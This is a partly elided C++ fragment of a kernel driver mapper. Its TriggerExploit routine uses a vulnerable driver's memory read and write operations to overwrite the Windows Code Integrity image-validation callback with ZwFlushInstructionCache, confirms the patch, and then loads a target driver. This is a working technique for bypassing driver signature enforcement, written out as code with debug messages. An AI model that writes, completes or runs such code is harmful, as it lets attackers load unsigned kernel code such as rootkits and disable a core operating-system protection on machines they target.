...
namespace MapperCore {
    ...
    NTSTATUS TriggerExploit(PCWSTR targetDriverFileName) {
        ...
        if (!ciValidateImageHeaderEntry || !zwFlushInstructionCache) {
            printf("[-] CI callback or ZwFlush is null (ciEntry=%p, zwFlush=%p)\n",
                   ciValidateImageHeaderEntry, zwFlushInstructionCache);
            VulnDriver::CloseDevice(deviceHandle);
            return STATUS_UNSUCCESSFUL;
        }

        printf("[DBG] TriggerExploit: ciValidateImageHeaderEntry=%p, zwFlushInstructionCache=%p\n",
               ciValidateImageHeaderEntry, zwFlushInstructionCache);

        PVOID originalCallback = nullptr;
        
        printf("[DBG] TriggerExploit: reading original CI callback from kernel addr %p...\n", ciValidateImageHeaderEntry);
        status = VulnDriver::ReadKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));

        if (!NT_SUCCESS(status)) {
            printf("[-] Failed to read original CI callback: 0x%08X\n", status);
            printf("[DBG] TriggerExploit: ReadKernelMemory failed - this is likely a CR3/page-table translation issue\n");
            printf("[DBG] TriggerExploit: the vuln driver IOCTL may not be able to map the required physical memory\n");
            VulnDriver::CloseDevice(deviceHandle);
            return status;
        }

        printf("[DBG] TriggerExploit: original CI callback value=%p\n", originalCallback);
        g_OriginalCiCallback = originalCallback;
        g_CiCallbackAddress = ciValidateImageHeaderEntry;

        printf("[DBG] TriggerExploit: writing ZwFlush (%p) to CI callback addr %p...\n",
               zwFlushInstructionCache, ciValidateImageHeaderEntry);
        ...
        PVOID verifyPatch = nullptr;
        VulnDriver::ReadKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &verifyPatch, sizeof(PVOID));
        if (verifyPatch != zwFlushInstructionCache) {
            printf("[-] CI callback patch verification FAILED: expected=%p, got=%p\n", zwFlushInstructionCache, verifyPatch);
        } else {
            printf("[DBG] CI callback patch verification: OK\n");
        }
        ...
        bool driverLoaded = NT_SUCCESS(status) || 
                            status == STATUS_OBJECT_NAME_COLLISION || 
                            status == STATUS_IMAGE_ALREADY_LOADED;

        if (status == STATUS_OBJECT_NAME_COLLISION || status == STATUS_IMAGE_ALREADY_LOADED) {
            printf("[*] Target driver already loaded (0x%08X), treating as success\n", status);
